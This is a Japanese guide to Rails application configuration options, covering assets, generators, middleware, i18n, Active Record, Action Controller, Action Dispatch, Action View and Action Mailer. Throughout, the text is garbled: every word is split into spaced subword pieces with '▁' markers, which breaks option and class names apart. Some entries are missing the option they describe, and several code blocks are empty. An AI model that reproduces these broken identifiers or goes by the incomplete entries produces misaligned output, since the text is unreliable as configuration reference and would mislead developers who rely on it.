▁* ▁` config . eager _ load _ name space s ` を使用して 登録 した 名前 は 、` config . eager _ load ` が true の ときに 読み込まれ ます 。
▁ 登録 された 名前空間 は 、 必ず ` eager _ load !` メソッド に 応答 し なければなりません 。
▁* ▁` config . eager _ load _ path s ` は 、 パス の配列 を 引数に 取り ます 。 Rails は 、 cache _ classes が オン の 場合に この パス から 事 前 一 括 読み込み ( eager ▁ load ) します 。
▁ デフォルトで は アプリケーションの ` app ` ディレクトリ 以下の すべての ディレクトリ が 対象 です 。
▁* ▁` config . en co d ing ` は アプリケーション 全体 の エ ン コ ー デ ィ ング を指定します 。
▁デフォルトは UT F - 8 です 。
▁* ▁` config . except ions _ app ` は 、 例外 が 発生 したときに S h o w E x ce p tion ミドルウェア によって 呼び出される アプリケーション 例外 を設定します 。
▁デフォルトは ` ActionDispatch :: P ub li c E x ce p tion s . new ( Rails . public _ path ) ` です 。
▁* ▁` config . file _ w at ch er ` は 、` config . reload _ classes _ only _ on _ change ` が true の 場合に ファイル システム 上の ファイル 更新 検出 に 使用される クラス を指定します 。
▁` ActiveSupport :: File U p date C h ec k er ` ▁API に従う 必要があります 。
▁* ▁` config . filter _ parameters ` は 、 パスワード や ク レ ジ ッ ト カ ー ド 番号 など 、 ログ に 出力 し たくない パラメータ を フィルタ で 除 外 するために 使用します 。
▁ パスワードを 除 外 する アプリケーション フィルタ を追加する には ` config / initializers / filter _ param e ter _ log g ing . rb ` を ` config . filter _ parameters + = [: password ] ` に追加します 。
▁* ▁` config . force _ s s l ` は 、` ActionDispatch :: SSL ` ミドルウェア を使用して 、 すべての リクエストを HTTP S プロトコル 下 で 実行 する よう 強 制 します 。
▁* ▁` config . log _ format ter ` は Rails ロガー の フォーマット を定義し ます 。
▁この オプションは 、 デフォルトで は ` ActiveSupport :: Logger :: S im p le Form at ter ` の インスタンス を使用します 。 ただし production モード の場合 のみ ` Logger :: Form at ter ` が デフォルト になります 。
▁* ▁` config . log _ le ve l ` は 、 Rails の ログ 出力 を どの ぐらい 詳 細 に するか を指定します 。
▁* ▁` config . log _ tag s ` は 、` request ` オブジェクトが 応答 する メソッドの リスト を 引数に 取り ます 。
▁これは 、 ログ の 行 に デバッグ情報 を タグ 付け する 場合に 便利です 。 たとえば サブ ドメイン や リクエスト id を指定する ことができ 、 これらは マ ル チ ユーザーの production モード アプリケーションを デバッグ するのに 便利です 。
▁* ▁` config . logger ` は 、 ロガー を指定します 。 指定 される ロガー は 、 L o g 4 r または Ruby の デフォルトの ` Logger ` クラスの インターフェイス に従い ます 。
▁* ▁` config . middleware ` は 、 アプリケーション で使用する ミドルウェア を カスタマイズ できます 。
▁詳細については [ ミドルウェア を設定する ]( # ミドルウェア を設定する ) の 節 を参照してください 。
▁* ▁` config . reload _ classes _ only _ on _ change ` は 、 監 視 している ファイル が変更され た場合 に のみ クラス を 再 読み込み する かどうかを指定します 。
▁ デフォルトで は 、 autoload _ path で 指定された すべての ファイルが 監 視 対象 と なり 、 デフォルトで true が 設定 されます 。
▁` config . cache _ classes ` が オン の場合は この オプションは 無視 されます 。
▁` secret s . secret _ key _ base ` メソッドは 、 改 竄 防止 のために 、 アプリケーションの セッション を 既 知 の 秘 密 キー と 照 合 するための キー を指定する ときに 使い ます 。
▁ アプリケーション は ` secret s . secret _ key _ base ` を使用して 、` config / secret s . yml ` など に保存 される キー を ランダム に 初期化 します 。
▁ デフォルトの 設定 とは 異 なり 、 W E B ri c k を使用して アプリケーションを production モード で 実行 したり ( これは 絶 対 に や らない で ください ) テスト する 場合は true に 設定 されます 。
▁ そう でない と 、 ページ キャッシュ が 有効 に な らず 、 public ディレクトリ 以下 に 常 駐 する 静 的 ファイル への リクエスト が 毎 回 Rails アプリケーション を経由して し ま います 。
▁* ▁` config . session _ store ` は 、 通常 は ` config / initializers / session _ store . rb ` で 設定 される もの であり 、 セッション を保存する クラス を指定します 。
▁ 指定 できる 値 は `: cookie _ store ` ( デフォルト ) 、`: me m _ cache _ store `、` : d is able d ` です 。
▁`: d is able d ` を指定すると 、 Rails で セッション が 扱 わ れ なくなります 。
▁ カスタム セッション スト ア を指定する こともできます 。
▁config . session _ store ▁: my _ custom _ store
▁ カスタム スト ア は ` ActionDispatch :: Session :: M y C us to m S to re ` として 定義 する必要があります 。
▁* ▁` config . time _ zone ` は アプリケーションの デフォルト タイムゾーン を 設定 し 、 Active ▁Record で 認 識 できるようにします 。
▁### ▁ アセット を設定する
▁* ▁` config . assets . en able d ` は 、 アセットパイプライン を有効に する かどうかを指定します 。
▁デフォルトは true です 。
▁この オプションは ` production ` 環境 で使用する と デプロイ 時に 思 わ ぬ 動作 を する 可能性があります ので 、 development 環境 ( ` config / environments / development . rb ` ) で使用する ことをお勧めします 。
▁* ▁` config . assets . com pre s s ` は 、 コンパイル 済み アセット を 圧 縮 する かどうか を指定する フラグ です 。
▁` config / environments / production . rb ` では 明示的に true に 設定 されています 。
▁* ▁` config . assets . css _ compressor ` は 、 CSS の 圧 縮 に 使用する プログラム を定義し ます 。
▁この オプションは 、` sass - rails ` を使用すると デフォルトで 設定 されます 。
▁この オプション では `: y u i ` という 一 風 変 わ った オプションを 指定できます 。 これは ` y u i - compressor ` ▁gem の ことです 。
▁* ▁` config . assets . js _ compressor ` は 、 JavaScript の 圧 縮 に 使用する プログラム を定義し ます 。
▁ 指定 できる 値 は `: c lo s ur e `、` : ug li fi er `、` : y u i ` です 。 それぞれ ` c lo s ur e - compile r `、` ug li fi er `、` y u i - compressor ` ▁gem に 対応 します 。
▁* ▁` config . assets . path s ` には 、 アセット 探 索 用の パス を指定します 。
▁この 設定 オプション に パス を追加する と 、 アセット の 検索 先 として 追加 されます 。
▁* ▁` config . assets . pre compile ` は 、` application . css ` と ` application . js ` 以外に 追加 したい アセット がある場合 に 指定 します 。 これらは ` rake ▁ assets : pre compile ` を実行する ときに 一 緒 に プリコンパイル されます 。
▁* ▁` config . assets . prefix ` は アセット を 置 く ディレクトリ を指定します 。
▁デフォルトは ` / assets ` です 。
▁* ▁` config . assets . debug ` は 、 デバッグ 用 に アセット の 連 結 と 圧 縮 を や め る かどうかを指定します 。
▁` development . rb ` では デフォルトで ` true ` に 設定 されます 。
▁* ▁` config . assets . cache _ store ` は 、 Sprockets で使用する キャッシュ スト ア を定義し ます 。
▁デフォルトは 以下の とおりです 。
▁* ▁` config . assets . version ` は M D 5 ハッシュ 生成 に 使用される オプション 文字列 です 。
▁この 値 を変更する と 、 すべての アセット ファイルが 強 制 的に リ コンパイル されます 。
▁* ▁` config . assets . compile ` は 、 production 環境で の 動的な Sprockets コンパイル を オン にする かどうかを true / false で 指定 します 。
▁* ▁` config . assets . logger ` は ロガー を 引数に 取り ます 。 この ロガー は 、 L o g 4 の インターフェイス か 、 Ruby の ` Logger ` クラス に従い ます 。
▁ デフォルトで は 、` config . logger ` と同じ 設定 が使用されます 。
▁` config . assets . logger ` を false に設定する と 、 アセット の ログ 出力 が オフ になります
▁### ▁ ジェネレータ の設定
▁` config . g en er at or s ` メソッドを使用して 、 Rails で 使用される ジェネレータ を変更 できます 。
▁このメソッドは ブロック を 1 つ 取り ます 。
▁config . g en er at or s ▁do ▁| g |
▁ g . or m ▁: active _ record
▁ g . test _ f r am e w or k ▁: test _ un it
▁ ブロック で 使用 可能な メソッドの 完全な リスト は 以下の とおりです 。
▁* ▁` assets ` は 、 scaffold を生成する かどうかを指定します 。
▁デフォルトは ` true ` です 。
▁* ▁` force _ p l ur al ` は 、 モデル名 を 複数形 にする かどうかを指定します 。
▁デフォルトは ` false ` です 。
▁* ▁` helper ` は ヘルパー を生成する かどうかを指定します 。
▁* ▁` integration _ to ol ` は 、 使用する 統合 ツール を定義し ます 。
▁デフォルトは ` nil ` です 。
▁* ▁` javascripts ` は 、 生成 時に JavaScript ファイル への フック を オン にする かどうかを指定します 。
▁この 設定 は ` scaffold ` ジェネレータ の 実行 中に 使用されます 。
▁* ▁` javascript _ engine ` は 、 アセット 生成 時に ( coffee など で ) 使用する エンジン を設定します 。
▁* ▁` or m ` は 、 使用する O R M ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ を指定します 。
▁デフォルトは ` false ` であり 、 この場合は Active ▁Record が使用されます 。
▁* ▁` resource _ controller ` は 、` rails ▁ generate ▁ resource ` の 実行 時に どの ジェネレータ を使用して コントローラ を生成する か を指定します 。
▁デフォルトは `: controller ` です 。
▁デフォルトは `: scaffold _ controller ` です 。
▁* ▁` stylesheets ` は 、 ジェネレータ で スタイルシート の フック を行なう かどうかを指定します 。
▁この 設定 は ` scaffold ` ジェネレータ の 実行 時に 使用されます が 。 この フック は 他の ジェネレータ でも 使用されます 。
▁* ▁` stylesheet _ engine ` は 、 アセット 生成 時に 使用される 、 sass などの スタイルシート エンジン を指定します 。
▁デフォルトは `: css ` です 。
▁* ▁` test _ f r am e w or k ` は 、 使用する テスト フレームワーク を指定します 。
▁デフォルトは ` false ` であり 、 この場合は Test :: U n it が使用されます 。
▁* ▁` template _ engine ` は ビュー の テンプレート エンジン ( ERB や H am l など ) を指定します 。
▁デフォルトは `: erb ` です 。
▁### ▁ ミドルウェア を設定する
▁ どの Rails アプリケーションの 背 後に も 、 いくつかの 標準的な ミドルウェア が 配置 されています 。 development 環境で は 、 以下の 順序 で ミドルウェア を使用します 。
▁* ▁` ActionDispatch :: SSL ` は すべての リクエスト に HTTP S プロトコル を 強 制 します 。
▁これは ` config . force _ s s l ` を ` true ` に すると 有効 になります 。
▁ 渡す オプションは ` config . s s l _ options ` で 設定 できます 。
▁* ▁` ActionDispatch :: S t a tic ` は 静 的 アセット で 使用されます 。
▁* ▁` Rack :: L ock ` は 、 アプリケーションを ミ ュ ー テ ッ ク ス で ラ ッ プ し 、 1 度 に 1 つの ス レ ッ ド で しか 呼び出され ないように します 。
▁この ミドルウェア は 、` config . cache _ classes ` が ` false ` に 設定 されている 場合 のみ 有効 になります 。
▁* ▁` ActiveSupport :: Cache :: S tr at e g y :: L o c al Cache ` は 基本的な メモリ バ ッ ク アップ 式 キャッシュ として 機能 します 。
▁この キャッシュ は ス レ ッ ド セ ー フ ではなく 、 単 一 ス レ ッ ド 用の 一時 メモリ キャッシュ として 機能 すること のみ を 意 図 している ことにご注意ください 。
▁* ▁` Rack :: R un time ` は ` X - R un time ` ヘッダー を設定します 。 この ヘッダー には 、 リクエスト の 実行 に か か る 時間 ( 秒 ) が含まれ ます 。
▁* ▁` Rails :: Rack :: Logger ` は 、 リクエスト が 開 始 された ことを ログ に 通知 します 。
▁ リクエスト が 完了 すると 、 すべての ログ を フ ラ ッ シ ュ します 。
▁* ▁` ActionDispatch :: S h o w E x ce p tion s ` は 、 アプリケーション から 返される すべての 例外 を re sc u e し 、 リクエスト が ローカル である か ` config . con s id er _ all _ request s _ local ` が ` true ` に 設定 されている 場合に 適切な 例外 ページを 出力 します 。
▁` config . action _ dispatch . show _ except ions ` が ` false ` に 設定 されている と 、 常に 例外 が 出力 されます 。
▁* ▁` ActionDispatch :: Request I d ` は 、 レスポンス で 使用できる 独自の X - Request - I d ヘッダー を作成し 、` ActionDispatch :: Request # u u id ` メソッド を有効に します 。
▁* ▁` ActionDispatch :: Re m o te I p ` は I P ス プ ー フ ィ ング 攻撃 が行われ ていない かどうかをチェックし 、 リクエスト ヘッダー から 正しい ` client _ ip ` を取得し ます 。
▁この 設定 は ` config . action _ dispatch . ip _ s p o of ing _ check ` オプション と ` config . action _ dispatch . tr us t ed _ pro x ies ` オプション で 変更 可能です 。
▁* ▁` Rack :: S end file ` は 、 body が 1 つの ファイル から 作成 されている レスポンス を キャッチ し 、 サーバー 固有の X - S end file ヘッダー に 差 し 替 え て から 送信 します 。
▁この 動作 は ` config . action _ dispatch . x _ s end file _ header ` で 設定 可能です 。
▁* ▁` ActionDispatch :: Callbacks ` は 、 リクエスト に応答する 前に 、 事 前 コールバック を実行します 。
▁* ▁` ActiveRecord :: Connection A d a p ter s :: Connection M an a gem ent ` は 、 リクエスト ごとに ア ク テ ィ ブ な 接続 を ク リ ア します 。 ただし リクエスト 環境で ` rack . test ` キー が ` true ` に 設定 されている 場合 を 除 きます 。
▁* ▁` ActiveRecord :: Query Cache ` は 、 リクエスト によって 生成された すべての SELECT クエリ を キャッシュ します 。
▁ IN S ER T または U P DAT E が発生する と キャッシュ は ク リ ア されます 。
▁* ▁` ActionDispatch :: Co o k ies ` は リクエスト に対応する cookie を設定します 。
▁* ▁` ActionDispatch :: Session :: Co o k i e S to re ` は 、 セッション を cookie に保存 する 役 割 を 担 います 。
▁` config . action _ controller . session _ store ` の値 を変更する と 別の ミドルウェア を使用できます 。
▁これ に渡され る オプションは ` config . action _ controller . session _ options ` を使用して 設定 できます 。
▁* ▁` ActionDispatch :: F la sh ` は ` flash ` キー を設定します 。
▁これは 、` config . action _ controller . session _ store ` に 値が 設定 されている 場合に のみ 有効 です 。
▁* ▁` ActionDispatch :: P ar am s P ar s er ` は 、 リクエスト から パラメータ を 切り 出 して ` params ` に保存 します 。
▁* ▁` Rack :: M e th o d O ver ri de ` は 、` params [: _ method ] ` が 設定 されている 場合に メソッドを 上 書き できるようにします 。
▁これは 、 HTTP で PATCH 、 PUT 、 DELETE メソッド を使用 できるように する ミドルウェア です 。
▁` config . middleware . us e ` メソッドを使用すると 、 上 記 以外に 独自の ミドルウェア を追加する こともできます 。
▁config . middleware . us e ▁Ma g ical :: U n i c or n s
▁上の 指定 により 、` M a g ical :: U n i c or n s ` ミドルウェア が ス タ ッ ク の最後 に追加 されます 。
▁ ある ミドルウェア の 前に 別の ミドルウェア を追加し たい場合は ` in s er t _ before ` を使用します 。
▁ ある ミドルウェア の 後に 別の ミドルウェア を追加し たい場合は ` in s er t _ after ` を使用します 。
▁これらの ミドルウェア は 、 まったく 別の もの に 差 し 替 え る こともできます 。
▁config . middleware . s w a p ▁ ActionController :: F a il safe , ▁ L if o :: F a il safe
▁ 同様に 、 ミドルウェア を ス タ ッ ク から 完全に 取り 除 く こともできます 。
▁config . middleware . delete ▁" Rack :: M e th o d O ver ri de "
▁### ▁ i 18 n を設定する
▁以下の オプション はすべて ` i 18 n ` ( in ter n ation a li z ation : ▁ 国 際 化 ) ライブラリ 用の オプション です 。
▁* ▁` config . i 18 n . available _ local es ` は 、 アプリケーションで 利用できる ロケール を ホワイトリスト 化 します 。
▁ デフォルトで は 、 ロケール ファイル にある ロケール キー はすべて 有効 になります が 、 新しい アプリケーション の場合 、 通常 は `: en ` だけです 。
▁* ▁` config . i 18 n . default _ local e ` は 、 アプリケーションの i 18 n で使用する デフォルトの ロケール を設定します 。
▁デフォルトは `: en ` です 。
▁* ▁` config . i 18 n . en force _ available _ local es ` が オン になっている と 、` available _ local es ` リスト で 宣言 されていない ロケール は i 18 n に 渡 せ なくなります 。 利用 できない ロケール がある場合 は ` i 18 n :: In valid L o ca le ` 例外が発生します 。
▁デフォルトは ` true ` です 。
▁この オプションは 、 ユーザー 入力 の ロケール が 不 正 である 場合 の セキュリティ 対策 である ため 、 特別な 理由 がない 限 り 無効 に しないでください 。
▁* ▁` config . i 18 n . load _ path ` は 、 ロケール ファイルの 探 索 パス を設定します 。
▁デフォルトは ` config / local es / * . { yml , rb } ` です 。
▁### ▁Active ▁Record を設定する 。
▁` config . active _ record ` には 多くの オプション が 含まれています 。
▁* ▁` config . active _ record . logger ` は 、 L o g 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます 。 この ロガー は 以後 作成される すべての 新しい データベース 接続 に渡され ます 。
▁Active ▁Record の モデル クラス または モデル インスタンス に対して ` logger ` メソッド を呼び出す と 、 この ロガー を 取り 出 せ ます 。
▁ ログ 出力 を 無効 に するには ` nil ` を設定します 。
▁* ▁` config . active _ record . primary _ key _ prefix _ type ` は 、 主キー カラム の 命 名 法 を変更する の に 使用します 。
▁Rails の デフォルトで は 、 主キー カラム の名前 に ` id ` が使用されます ▁( なお ` id ` に したい場合は 値を 設定 する必要はありません )。
▁` id ` 以外に 以下の 2 つ を 指定できます 。
▁** ▁`: table _ name ` を指定すると 、 たとえば Customer クラスの 主キー は ` customer id ` になります
▁** ▁`: table _ name _ with _ underscore ` を指定すると 、 たとえば Customer クラスの 主キー は ` customer _ id ` になります
▁* ▁` config . active _ record . table _ name _ prefix ` は 、 テーブル 名 の 冒 頭 に グ ロー バ ル に追加 したい 文字列 を指定します 。
▁たとえば ` n or th w e st _ ` を指定すると 、 Customer クラス は ` n or th w e st _ customer s ` を テーブル として 探 します 。
▁デフォルトは 空 文字列 です 。
▁* ▁` config . active _ record . table _ name _ s u f fi x ` は テーブル 名 の 後 ろ に グ ロー バ ル に追加 したい 文字列 を指定します 。
▁たとえば ` _ n or th w e st ` を指定すると 、 Customer は ` customer s _ n or th w e st ` を テーブル として 探 します 。
▁* ▁` config . active _ record . s ch e ma _ migration s _ table _ name ` は 、 スキーマ マイグレーション テーブル の名前 として 使用する 文字列 を指定します 。
▁* ▁` config . active _ record . pluralize _ table _ name s ` は 、 Rails が 探 す データベースの テーブル 名を 単数形 に するか 複数形 に するか を指定します 。
▁true に設定する と 、 Customer クラス が 使用する テーブル 名 は 複数形 の ` customer s ` になります ( デフォルト )。
▁false に設定する と 、 Customer クラス が 使用する テーブル 名 は 単数形 の ` customer ` になります 。
▁* ▁` config . active _ record . default _ time zone ` は 、 データベースから 日付 ・ 時刻 を取り出し た 際 の タイムゾーン を ` Time . local ` ▁( `: local ` を 指定 した 場合 ) と ` Time . u t c ` ▁( `: u t c ` を 指定 した 場合 ) の どちら に するか を指定します 。
▁デフォルトは `: u t c ` です 。
▁* ▁` config . active _ record . s ch e ma _ format ` は 、 データベース スキーマ を ファイルに 書き 出 す 際 の フォーマット を指定します 。
▁デフォルトは `: ruby ` で 、 データベースに は 依 存 せ ず 、 マイグレーション に 依 存 します 。 `: sql ` を指定すると SQL 文 で 書き 出 されます が 、 この場合 潜 在 的に データベースに 依 存 する 可能性があります 。
▁* ▁` config . active _ record . timestamp ed _ migration s ` は 、 マイグレーション ファイル名 に シ リ ア ル 番号 と タイムスタンプ の どちら を与える か を指定します 。
▁デフォルトは true で 、 タイムスタンプ が使用されます 。 開発者 が 複数の 場合は 、 タイムスタンプ の 使用 を お勧め します 。
▁* ▁` config . active _ record . lock _ o p t im ist ical ly ` は 、 Active ▁Record で 楽 観 的 ロ ッ ク ( o p t im is tic ▁ lock ing ) を使用する かどうかを指定します 。 デフォルト は true ( 使用する ) です 。
▁* ▁` config . active _ record . cache _ timestamp _ format ` は 、 キャッシュ キー に含まれる タイムスタンプ 値 の 形式 を指定します 。
▁デフォルトは `: number ` です 。
▁* ▁` config . active _ record . record _ timestamp s ` は 、 モデル で 発生 する ` create ` 操作 や ` update ` 操作 に タイムスタンプ を 付け る かどうか を指定する 論理値 です 。
▁ デフォルト値 は ` true ` です 。
▁* ▁` config . active _ record . partial _ write s ` は 、 部分 書き 込 み を行なう かどうか ( 「 d ir t y 」 と マーク された 属性 だけ を更新する か ) を指定する 論理値 です 。
▁ データベース で 部分 書き 込 み を使用する場合 は 、` config . active _ record . lock _ o p t im ist ical ly ` で 楽 観 的 ロ ッ ク も 使用 する必要があります 。 これは 、 同 時 更新 が 行われた 場合に 、 読み出し の 状態 が 古 い 情報 に基づいて 属性 に 書き 込 まれ る 可能性 がある ためです 。
▁* ▁` config . active _ record . main t a in _ test _ s ch e ma ` は 、 テスト 実行 時に Active ▁Record が テスト 用 データベース スキーマ を ` db / s ch e ma . rb ` ( または ` db / structure . sql ` ) に基いて 最新の 状態 にする かどうかを指定します 。
▁ デフォルト値 は ` true ` です 。
▁* ▁` config . active _ record . d um p _ s ch e ma _ after _ migration ` は 、 マイグレーション 実行 時に スキーマ ダ ン プ ( ` db / s ch e ma . rb ` または ` db / structure . sql ` ) を行なう かどうかを指定します 。
▁この オプションは 、 Rails が 生成 する ` config / environments / production . rb ` では false に 設定 されます 。
▁この オプション が 無 指定 の場合は 、 デフォルトの true が 指定 されます 。
▁ MySQL ア ダ プ ター を使用すると 、 以下の 設定 オプション が 1 つ 追加 されます 。
▁* ▁` ActiveRecord :: Connection A d a p ter s :: M y sql A d a p ter . e m ul at e _ boolean s ` は 、 Active ▁Record が MySQL データベース 内の すべての ` t in y in t (1) ` カラム を デフォルトで boolean にする かどうかを指定します 。 デフォルト は true です 。
▁ スキーマ ダ ン パ ー は 以下の オプション を追加します 。
▁* ▁` ActiveRecord :: S ch e ma D um per . ig no re _ table s ` は テーブル 名 の配列 を 1 つ 引数に 取り ます 。 どの スキーマ ファイル にも ▁ _ 含 め たくない _ ▁ テーブル 名 がある場合 はこの 配列 に テーブル 名 を含め ます 。
▁この 設定 は 、` config . active _ record . s ch e ma _ format ▁= = ▁: ruby ` で 「 ない 」 場合は 無視 されます 。
▁### ▁Action ▁ Controller を設定する
▁` config . action _ controller ` には 多数の 設定 が 含まれています 。
▁* ▁` config . action _ controller . asset _ host ` は アセット を 置 く ための ホスト を設定します 。
▁これは 、 アセット を ホスト する 場所 として アプリケーション サーバー の 代りに CDN ( コンテンツ 配信 ネットワーク ) を使用したい場合 に 便利です 。
▁* ▁` config . action _ controller . perform _ ca ch ing ` は 、 アプリケーションで キャッシュ を行なう かどうかを指定します 。
▁ development モード では false 、 production モード では true に設定し ます 。
▁* ▁` config . action _ controller . default _ static _ ext en s ion ` は 、 キャッシュ された ページに 与え る 拡張子 を指定します 。
▁デフォルトは ` . html ` です 。
▁* ▁` config . action _ controller . default _ cha r set ` は 、 すべての 画面 出力 で 使用される デフォルトの 文字 セット を指定します 。
▁デフォルトは " u t f - 8 " です 。
▁* ▁` config . action _ controller . logger ` は 、 L o g 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます 。 この ロガー は 、 Action ▁ Controller から の 情報を ログ 出力 するために 使用されます 。
▁* ▁` config . action _ controller . request _ f org e ry _ pro te c tion _ token ` は 、 Request F org e ry 対策 用の トークン パラメータ 名 を設定します 。
▁C all ing ▁` pro te ct _ from _ f org e ry ` を呼び出す と 、 デフォルトで `: a u the n tic ity _ token ` が 設定 されます 。
▁* ▁` config . action _ controller . allow _ f org e ry _ pro te c tion ` は 、 CSRF 保 護 を オン にする かどうかを指定します 。
▁test モード では デフォルトで ` false ` に 設定 され 、 それ 以外 では ` true ` に 設定 されます 。
▁* ▁` config . action _ controller . re l at ive _ url _ root ` は 、[ サブディレクトリ への デプロイ ]( config ur ing . html # サブディレクトリ にデプロイする - 相 対 url ルート の 使用 ) を行う ことを Rails に 伝 え るために 使用できます 。
▁デフォルトは ` ENV [' R A I L S _ RE L A T I V E _ URL _ R O O T '] ` です 。
▁* ▁` config . action _ controller . per m it _ all _ parameters ` は 、 マ ス ア サ イン メ ン ト される すべての パラメータ を デフォルトで 許可 すること を設定します 。
▁ デフォルト値 は ` false ` です 。
▁* ▁` config . action _ controller . action _ on _ un per m i tt ed _ parameters ` は 、 明示的に 許可 されていない パラメータ が 見つか った 場合に ログ 出力 または 例外 発生 を行なう かどうかを指定します 。
▁この オプションは 、`: log ` または `: raise ` を指定すると 有効 になります 。
▁test 環境 と development 環境で の デフォルト は `: log ` であり 、 それ以外の 環境で は ` false ` が 設定 されます 。
▁### ▁Action ▁D is patch を設定する
▁* ▁` config . action _ dispatch . session _ store ` は セッション データ の スト ア 名 を設定します 。
▁ デフォルトの スト ア 名 は `: cookie _ store ` です 。 この 他 に `: active _ record _ store `、` : me m _ cache _ store ` 、 または カスタム クラス の名前 を 指定できます 。
▁* ▁` config . action _ dispatch . default _ header s ` は 、 HTTP ヘッダー で 使用される ハッシュ です 。 この ヘッダー はデフォルトで すべての レスポンス に 設定 されます 。
▁この オプションは 、 デフォルトで は 以下のように 設定 されます 。
▁config . action _ dispatch . default _ header s ▁= ▁ {
▁' X - F r am e - O p tion s ' ▁=> ▁' S A M E O R I G IN ',
▁' X - XSS - Pro te c tion ' ▁=> ▁' 1 ; ▁ mod e = block ',
▁' X - Content - Type - O p tion s ' ▁=> ▁' no s n if f '
▁ }
▁* ▁` config . action _ dispatch . t l d _ length ` は 、 アプリケーション で使用する ト ッ プ レベル ドメイン ( T L D ) ▁ の 長さ を指定します 。
▁デフォルトは ` 1 ` です 。
▁* ▁` config . action _ dispatch . http _ a u th _ s alt ` は 、 HTTP ▁A u th の s alt 値 ( 訳 注 : ▁ ハッシュの 安全 性 を 強 化 するために 加 え られ る ランダム な 値 ) を設定します 。
▁デフォルトは ` ' http ▁ authentication ' ` です 。
▁* ▁` config . action _ dispatch . signed _ cookie _ s alt ` は 、 署 名 済み cookie 用の s alt 値 を設定します 。
▁デフォルトは ` ' signed ▁ cookie ' ` です 。
▁* ▁` config . action _ dispatch . en c ry p t ed _ cookie _ s alt ` は 、 暗号化 済み cookie 用の s alt 値 を設定します 。
▁デフォルトは ` ' en c ry p t ed ▁ cookie ' ` です 。
▁* ▁` config . action _ dispatch . en c ry p t ed _ signed _ cookie _ s alt ` は 、 署 名 暗号化 済み cookie 用の s alt 値 を設定します 。
▁デフォルトは ` ' signed ▁ en c ry p t ed ▁ cookie ' ` です 。
▁* ▁` config . action _ dispatch . perform _ deep _ m un g e ` は 、 パラメータ に対して ` deep _ m un g e ` メソッドを 実行 すべき かどうかを指定します 。
▁詳細については [ セキュリティ ガイド ]( security . html # 安全 でない クエリ 生成 ) を参照してください 。
▁デフォルトは true です 。
▁` ` ` ruby
▁` ` `
▁* ▁` ActionDispatch :: Callbacks . before ` には 、 リクエスト より 前に 実行 したい コード ブロック を 1 つ 引数として 与え ます 。
▁* ▁` ActionDispatch :: Callbacks . to _ prepare ` には 、 リクエスト より 前 かつ ` ActionDispatch :: Callbacks . before ` より 後に 実行 したい コード ブロック を 1 つ 引数として 与え ます 。
▁この ブロック は 、` development ` モード では すべての リクエスト で 実行されます が 、` production ` モード や 、` cache _ classes ` が ` true ` に 設定 されている 環境で は 1 度 しか 実行 されません 。
▁* ▁` ActionDispatch :: Callbacks . after ` には 、 リクエスト の 後に 実行 したい コード ブロック を 1 つ 引数として 与え ます 。
▁### ▁Action ▁ View を設定する
▁` config . action _ view ` にも わ す か ながら 設定 があります 。
▁* ▁` config . action _ view . field _ error _ pro c ` は 、 Active ▁Record で 発生 した エラー の 表示 に 使用する HTML ジェネレータ を指定します 。
▁ Proc . new ▁do ▁| html _ tag , ▁ instance |
▁% Q ( < div ▁class =" field _ with _ errors "> # { html _ tag }< / div > ). html _ safe
▁* ▁` config . action _ view . default _ form _ builder ` は 、 Rails で デフォルトで 使用する フォーム ビ ル ダ ー を指定します 。
▁デフォルトは 、` ActionView :: Helper s :: Form B u il de r ` です 。
▁ フォーム ビ ル ダ ー を 初期化 処理 の 後に 読み込み たい 場合 ( こうすることで development モード では フォーム ビ ル ダ ー が リクエスト の たびに 再 読 込 されます ) 、` String ` として 渡す こともできます 。
▁* ▁` config . action _ view . logger ` は 、 L o g 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として と ります 。 この ロガー は 、 Action ▁ View から の 情報を ログ 出力 するために 使用されます 。
▁* ▁` config . action _ view . erb _ tr im _ mod e ` は 、 ERB で使用する ト リ ム モード を指定します 。
▁デフォルトは ` ' - ' ` で 、` <%= ▁- % > ` または ` <%= ▁= % > ` の 場合に 末尾 スペース を削除し て 改 行 します 。
▁詳細については [ E r ub is ドキュメント ]( http :// www . k u w at a - la b . com / er ub is / users - guid e . 06 . html # to p i c s - tr im space s ) を参照してください 。
▁* ▁` config . action _ view . e m b ed _ a u the n tic ity _ token _ in _ remote _ form s ` は 、 フォーム で `: remote ▁=> ▁true ` を使用した 場合 の ` a u the n tic ity _ token ` の デフォルトの 動作 を設定します 。
▁ デフォルトで は false であり 、 この場合 リモート フォーム には ` a u the n tic ity _ token ` フォーム が含まれ ません 。 これは フォーム で フラグ メ ン ト キャッシュ を 使用している 場合に 便利です 。
▁ リモート フォーム は ` me t a ` タグ から 認 証 を 受け 取 る ので 、 JavaScript の動作 しない ブラウザ を サポート し なければならない ので なければ トークン の 埋め込み は 不要です 。
▁ JavaScript が 動か ない ブラウザ の サポート が 必要な 場合は 、`: a u the n tic ity _ token ▁=> ▁true ` を フォーム オプション として 渡す か 、 この 設定 を ` true ` に します 。
▁* ▁` config . action _ view . prefix _ partial _ path _ with _ controller _ name space ` は 、 名前空間化され た コントローラ から 出力 された テンプレート にある サブディレクトリ から 、 パーシャル ( 部分 テンプレート ) を 探 索 する かどうかを指定します 。
▁` ` ` erb
▁* ▁` config . action _ view . raise _ on _ m is s ing _ tr an s l ation s ` は 、 i 18 n で 訳 文 が 失 わ れ ている 場合に エラー を 発生 させる かどうかを指定します 。
▁### ▁Action ▁Mailer を設定する
▁` config . action _ mailer ` には 多数の 設定 オプション があります 。
▁* ▁` config . action _ mailer . logger ` は 、 L o g 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます 。 この ロガー は 、 Action ▁Mailer から の 情報を ログ 出力 するために 使用されます 。
▁* ▁` config . action _ mailer . smtp _ settings ` は 、`: smtp ` 配信 方法 を 詳 細 に設定する の に 使用できます 。
▁これは オプション の ハッシュ を 引数に 取り 、 以下の どの オプション でも 含 め ることができます 。
▁* ▁`: address ` ▁- ▁ リモート の メール サーバー を指定します 。
▁ デフォルトの " localhost " 設定 から 変更 します 。
▁* ▁`: port ` ▁- ▁ 使用する メール サーバー の ポート が 2 5 番 でない のであれば ( め った に ない と思います が ) 、 ここで 対応 できます 。
▁* ▁`: do main ` ▁- ▁ H E L O ドメイン の 指定 が 必要な 場合に 使用します 。
▁* ▁`: user _ name ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで ユーザー名 を設定します 。
